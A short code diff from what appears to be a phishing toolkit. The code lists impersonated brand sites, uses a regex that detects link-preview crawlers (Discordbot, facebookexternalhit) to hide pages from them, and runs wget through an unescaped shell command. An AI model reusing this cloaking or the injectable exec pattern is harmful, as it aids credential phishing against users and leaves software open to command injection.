@@ -49,7 +49,7 @@ const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
 const logError = chalk.redBright`[{whiteBright !}]`;
 const logInfo = chalk.yellowBright`[{whiteBright +}]`;
 const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
-const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
+const botDetecter = /(Discordbot|facebookexternalhit)/gi;
 const availableSites = {
 	Adobe: "adobe",
 	Airtelsim: "airtelsim",
@@ -489,6 +489,9 @@ async function startServer() {
 
 function downloadFile(url, filePath) {
 	return new Promise((resolve, reject) => {
+		if (!fs.existsSync(path.dirname(filePath))) {
+			fs.mkdirSync(path.dirname(filePath));
+		}
 		if (isLinux) {
 			child_process.exec(`wget -q --show-progress ${url} -O ${filePath}`, (error, stdout, stderr) => {
 				if (error) {
@@ -498,9 +501,6 @@ function downloadFile(url, filePath) {
 			});
 		} else {
 			const progressBar = new cliProgress.SingleBar({ format: `Downloading [${chalk.cyanBright("{bar}")}] {percentage}% || ETA: {eta}s`, clearOnComplete: true, hideCursor: true }, cliProgress.Presets.shades_classic);
-			if (!fs.existsSync(path.dirname(filePath))) {
-				fs.mkdirSync(path.dirname(filePath));
-			}
 			const file = fs.createWriteStream(filePath);
 			let receivedBytes = 0;
 			request
